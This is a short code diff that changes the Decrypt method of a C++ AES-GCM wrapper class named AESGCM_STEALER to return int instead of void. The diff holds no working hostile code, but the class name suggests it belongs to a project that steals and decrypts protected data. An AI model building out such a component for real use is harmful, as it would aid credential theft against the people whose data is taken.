@@ -21,7 +21,7 @@ class AESGCM_STEALER{
 
     public:
 
-        void Decrypt(BYTE* nonce, size_t nonceLen, BYTE* data, size_t dataLen, BYTE* macTag, size_t macTagLen);
+        int Decrypt(BYTE* nonce, size_t nonceLen, BYTE* data, size_t dataLen, BYTE* macTag, size_t macTagLen);
         void Encrypt(BYTE *nonce, size_t nonceLen, BYTE *data, size_t dataLen);
          AESGCM_STEALER(BYTE key[AES_256_KEY_SIZE]); // initialize with key 
          ~AESGCM_STEALER();
